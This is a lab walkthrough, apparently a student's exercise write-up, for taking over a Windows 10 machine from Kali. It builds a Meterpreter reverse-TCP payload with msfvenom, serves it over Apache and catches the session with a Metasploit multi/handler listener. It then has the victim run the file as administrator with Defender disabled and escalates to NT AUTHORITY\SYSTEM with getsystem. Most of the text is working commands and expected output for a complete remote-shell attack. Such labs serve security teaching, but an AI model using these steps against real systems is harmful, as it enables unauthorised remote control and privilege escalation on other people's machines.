# Security Tools: Escalate Privileges to SYSTEM Using Meterpreter's `getsystem` Command

---

## Objectives
- Deliver a custom Meterpreter reverse-shell payload to a Windows 10 target via a locally hosted web server.
- Establish a reverse Meterpreter session back to Kali.
- Escalate the session's privileges to `NT AUTHORITY\SYSTEM` using Meterpreter's `getsystem` command and confirm it.

---

## Tools
- **MSFVenom** — generates the Windows Meterpreter reverse-TCP payload (`reverseshell.exe`).
- **Apache2** (on Kali) — hosts the payload for the target to download.
- **ufw** — opens the listener port on Kali's firewall.
- **Metasploit Framework (`msfconsole`)** — sets up the `multi/handler` listener.
- **Meterpreter** — post-exploitation session used for `getsystem`, `getuid`, and shell access.

---

## Steps

### On Kali Linux (Attacker Machine)

**1. Get the Kali IP address (this is `LHOST`)**
```
ip a
```
(e.g., `192.168.1.17`)
```
ping -c5 <target IP address>
```

**2. Generate the payload with MSFVenom**
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.17 LPORT=4444 -f exe -o reverseshell.exe
sudo cp reverseshell.exe /var/www/html
service apache2 start
service apache2 status
```

**3. Allow the listener port through the firewall**
```
sudo ufw allow 4444/tcp
```

**4. Start Metasploit**
```
msfconsole
```

**5. Set up the listener**
```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.17
set LPORT 4444
exploit
```
This shows: `[*] Started reverse TCP handler on 192.168.1.17:4444` and waits for a connection.

### On Windows 10 (Target Machine)

1. Download/receive the payload (e.g., from Kali's HTTP server via browser):
   `http://192.168.1.17/reverseshell.exe`
2. Locate the payload file (usually in Downloads or Desktop).
3. Right-click `reverseshell.exe` → **Run as administrator**.
4. Accept the UAC prompt (click **Yes**).
5. If Windows Defender interferes: temporarily disable real-time protection in the lab environment, since it may silently quarantine or block the payload.

### Back on Kali (Attacker Machine)

You will see:
```
[*] Meterpreter session 1 opened (192.168.1.17:4444 -> 192.168.1.10:xxxxx)
```

**8. Inside the Meterpreter session, escalate privileges**
```
meterpreter > getsystem
meterpreter > getuid
```
Expected result:
```
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
Server username: NT AUTHORITY\SYSTEM
```

**9. Confirm via shell**
```
meterpreter > shell
C:\> whoami
nt authority\system
```

---

## My Solution:

[View My Solution:](https://youtu.be/-PExAEISjZ4)

---
